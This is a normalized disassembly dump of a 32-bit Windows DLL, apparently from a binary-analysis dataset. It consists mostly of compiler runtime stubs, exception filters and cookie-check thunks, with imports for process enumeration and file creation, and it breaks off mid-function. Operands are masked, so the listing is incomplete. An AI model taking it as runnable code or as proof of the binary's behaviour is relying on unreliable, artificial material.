mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_1001d34d
push 0x8
push r--data
call sub_10018984
call sub_10017c1c
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001431d
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001d36d
xor eax eax
inc eax
retn
sub_1001d386
call sub_10017c1c
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1001d34d
call eax
sub_1001d3bd
xor eax eax
inc eax
retn
sub_1001d3d1
push sub_1001d34d
call sub_10017955
pop ecx
mov [ rw-data ] eax
retn
sub_1001d3e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1001d437
push [ rw-data ]
call sub_100179d0
pop ecx
retn
sub_1001d5b8
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1001a3b0
pop ecx
sub_1001d5f4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001d603
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001d633
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_1001d64a
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
push 0x8
call [ SetLastError@IAT ]
sub_1001d766
push 0x4
call sub_1001a3b0
pop ecx
retn
sub_1001eed0
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1001f1ce
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001f196
pop ecx
pop ecx
pop ebp
retn
sub_1001f381
push 0x4
call sub_1001a3b0
pop ecx
retn
sub_1001f4e7
push 0x4
call sub_1001a3b0
pop ecx
retn
sub_1001f7c0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10020120
sub_1001f7d6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10020120
sub_1001f9a9
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_1001f956
add esp 0x10
pop ebp
retn
sub_1001feb9
push [ ebp + 0x8 ]
call sub_10020369
pop ecx
retn
sub_10020103
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001ffec
add esp 0x10
pop ebp
retn
sub_10020360
push 0xa
call sub_1001a3b0
pop ecx
retn
sub_10020463
push 0xa
call sub_1001a3b0
pop ecx
retn
sub_10020521
push 0xb
call sub_1001a3b0
pop ecx
retn
sub_1002052a
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10021429
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10021360
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10021474
call eax
retn
sub_10021477
push 0x2
call sub_10013ae8
pop ecx
retn
sub_100215e0
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1002245f
add esp 0xc
pop ebp
retn
sub_100221e4
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_100229a0
lea eax [ edx - 0x1 ]
pop ebx
retn
sub_10022a70
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
retn 0x8
sub_10022ac0
mov eax [ esp + 0x4 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
retn 0x8
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax 0x1
retn 0x8
sub_10022ae0
mov eax [ ecx ]
push eax
call [ LocalFree@IAT ]
retn
sub_10022af0
mov eax r--data
retn
sub_10022b00
mov eax r--data
retn
sub_10022b10
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
add esp 0x4
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_100236bc
mov eax rw-data
retn
sub_100236c2
mov eax rw-data
retn
sub_100236c8
mov eax sub_10024203
mov [ rw-data ] eax
mov [ rw-data ] sub_100238ea
mov [ rw-data ] sub_1002389e
mov [ rw-data ] sub_100238d7
mov [ rw-data ] sub_10023840
mov [ rw-data ] eax
mov [ rw-data ] sub_1002417b
mov [ rw-data ] sub_1002385c
mov [ rw-data ] sub_100237be
mov [ rw-data ] sub_1002374b
retn
sub_10023728
mov edi edi
push ebp
mov ebp esp
call sub_100236c8
call sub_1002428f
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_10024226
sub_1002389e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002385c
add esp 0x10
pop ebp
retn
sub_100238d7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1002374b
pop ecx
pop ecx
pop ebp
retn
sub_100238ea
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100237be
pop ecx
pop ecx
pop ebp
retn
sub_10026897
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_100268e0
lea ecx [ ebp - 0x10 ]
jmp sub_1000fe38
sub_100268e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026903
mov ecx [ ebp - 0x10 ]
jmp sub_100086dc
sub_1002690b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026926
mov ecx [ ebp - 0x10 ]
jmp sub_100086dc
sub_1002692e
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10001704
sub_10026939
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026954
lea ecx [ ebp - 0x10 ]
jmp sub_1000fe38
sub_1002695c
push [ ebp - 0x14 ]
call sub_10010ba2
pop ecx
retn
sub_10026966
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026981
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100269a0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_100269ae
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100269d0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_100269de
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026a00
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_10026a0e
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_10026a27
mov eax [ ebp - 0x2c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffd
mov ecx [ ebp + 0x4 ]
jmp sub_10001704
sub_10026a40
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026a60
lea ecx [ ebp - 0x30 ]
jmp sub_10022ae0
sub_10026a68
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_10001704
sub_10026a81
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026a89
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x40 ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_10010789
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026ab1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026acc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026ae7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026b02
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026b1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026b38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026b53
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000ff17
sub_10026b5e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026b79
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_1000971d
sub_10026b84
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026b9f
mov ecx [ ebp + 0x8 ]
jmp sub_1000fe38
sub_10026ba7
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10001704
sub_10026bb2
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_10001704
sub_10026bbd
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_10001704
sub_10026bc8
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_10001704
sub_10026bd3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026bee
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_100039e2
sub_10026bf9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026c14
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026c2f
mov ecx [ ebp - 0x10 ]
jmp sub_100108d3
sub_10026c37
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026c52
mov ecx [ ebp + 0x8 ]
jmp sub_100108d3
sub_10026c5a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026c75
push [ ebp - 0x14 ]
call sub_10010ba2
pop ecx
retn
sub_10026c7f
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10026c98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026cb6
lea ecx [ ebp - 0x50 ]
jmp sub_100086e3
sub_10026cbe
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026cc6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026ceb
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026cf3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026d18
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10026d20
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10010789
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026d48
mov eax [ ebp + 0x8 ]
jmp sub_100018c3
sub_10026d50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026d6b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026d86
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_10026d8e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026da9
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_1000175c
sub_10026db4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026dcf
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026dd7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026df2
lea eax [ ebp + 0x10 ]
jmp sub_1000305f
sub_10026dfa
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1000305f
sub_10026e05
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026e20
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1000305f
sub_10026e2b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026e46
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026e61
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026e69
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026e8e
push [ ebp - 0x14 ]
call sub_10010ba2
pop ecx
retn
sub_10026e98
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10026eb1
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_10007d1a
sub_10026ece
mov ecx [ ebp - 0x14 ]
jmp sub_100086dc
sub_10026ed6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026ef4
lea ecx [ ebp - 0x34 ]
jmp sub_100086e3
sub_10026efc
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026f04
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026f29
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001704
sub_10026f42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026f5d
mov ecx [ ebp + 0x8 ]
jmp sub_10008739
sub_10026f65
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026f6d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026f88
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026f90
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10026f98
lea ecx [ ebp - 0x48 ]
jmp sub_10001704
sub_10026fa0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026fc5
lea ecx [ ebp - 0x64 ]
jmp sub_10001704
sub_10026fcd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10026feb
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10026ff3
lea ecx [ ebp - 0x54 ]
jmp sub_10001704
sub_10026ffb
lea ecx [ ebp - 0x54 ]
jmp sub_10001704
sub_10027003
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027028
lea ecx [ ebp - 0x44 ]
jmp sub_10001704
sub_10027030
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002704b
push [ ebp - 0x14 ]
call sub_10010ba2
pop ecx
retn
sub_10027055
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_1002706e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002708c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100270a7
lea ecx [ ebp - 0x78 ]
jmp sub_100086e3
sub_100270af
lea ecx [ ebp - 0x48 ]
jmp sub_10001704
sub_100270b7
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_100270bf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100270e4
lea eax [ ebp - 0x24 ]
jmp sub_1000305f
sub_100270ec
lea eax [ ebp - 0x24 ]
jmp sub_1000305f
sub_100270f4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002710f
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10027117
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002713c
mov ecx [ ebp - 0x10 ]
jmp sub_100080d1
sub_10027144
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002715f
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_10008130
sub_1002716a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027185
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_1002718d
lea ecx [ ebp - 0x34 ]
jmp sub_100086e3
sub_10027195
lea esi [ ebp - 0x70 ]
jmp sub_1000175c
sub_1002719d
lea ecx [ ebp - 0x38 ]
jmp sub_100086e3
sub_100271a5
lea esi [ ebp - 0x54 ]
jmp sub_1000175c
sub_100271ad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100271d2
mov ecx [ ebp - 0x10 ]
jmp sub_10008739
sub_100271da
mov edi [ ebp - 0x10 ]
add edi 0x18
jmp sub_100014cd
sub_100271e5
mov eax [ ebp - 0x10 ]
add eax 0xd4
jmp sub_1000184a
sub_100271f2
mov esi [ ebp - 0x10 ]
add esi 0xec
jmp sub_1000175c
sub_10027200
mov esi [ ebp - 0x10 ]
add esi 0x108
jmp sub_1000175c
sub_1002720e
mov ecx [ ebp - 0x10 ]
add ecx 0x124
jmp sub_10008760
sub_1002721c
mov ecx [ ebp - 0x10 ]
add ecx 0x148
jmp sub_10008760
sub_1002722a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027245
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_1000102d
pop ecx
pop ecx
retn
sub_10027253
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002726e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027289
mov eax [ ebp + 0x8 ]
jmp sub_1000184a
sub_10027291
mov esi [ ebp + 0x8 ]
add esi 0x18
jmp sub_1000175c
sub_1002729c
mov ecx [ ebp + 0x8 ]
add ecx 0x34
jmp sub_10001704
sub_100272a7
mov ecx [ ebp + 0x8 ]
add ecx 0x50
jmp sub_10001704
sub_100272b2
mov esi [ ebp + 0x8 ]
add esi 0x6c
jmp sub_1000175c
sub_100272bd
mov esi [ ebp + 0x8 ]
add esi 0x88
jmp sub_1000175c
sub_100272cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100272e6
push [ ebp - 0x18 ]
call sub_10010ba2
pop ecx
retn
sub_100272f0
lea eax [ ebp - 0x20 ]
jmp sub_1000305f
sub_100272f8
lea edi [ ebp - 0x48 ]
jmp sub_1000bae7
sub_10027300
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov edi [ ebp + 0x8 ]
jmp sub_1000bae7
sub_10027319
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027334
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_1002733c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027357
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_10001704
sub_10027370
lea ecx [ ebp - 0x34 ]
jmp sub_10001704
sub_10027378
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027393
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_1002739b
lea ecx [ ebp - 0x48 ]
jmp sub_10001704
sub_100273a3
lea ecx [ ebp - 0xe0 ]
jmp sub_10001704
sub_100273ae
lea ecx [ ebp - 0xa8 ]
jmp sub_10001704
sub_100273b9
lea ecx [ ebp - 0x8c ]
jmp sub_10001704
sub_100273c4
lea ecx [ ebp - 0xc4 ]
jmp sub_10001704
sub_100273cf
lea ecx [ ebp - 0x70 ]
jmp sub_10001704
sub_100273d7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe8 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100273ff
lea ecx [ ebp - 0x70 ]
jmp sub_10001704
sub_10027407
lea ecx [ ebp - 0x70 ]
jmp sub_10001704
sub_1002740f
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10027417
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027438
lea ecx [ ebp - 0x14 ]
jmp sub_1000fe38
sub_10027440
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002745b
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_10027463
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002747e
lea ecx [ ebp - 0x30 ]
jmp sub_100086e3
sub_10027486
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_1002748e
lea esi [ ebp - 0x60 ]
jmp sub_1000175c
sub_10027496
lea esi [ ebp - 0x60 ]
jmp sub_1000175c
sub_1002749e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100274c3
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_100274cb
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_100274d3
lea esi [ ebp - 0x48 ]
jmp sub_1000175c
sub_100274db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027500
lea esi [ ebp - 0x30 ]
jmp sub_1000175c
sub_10027508
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
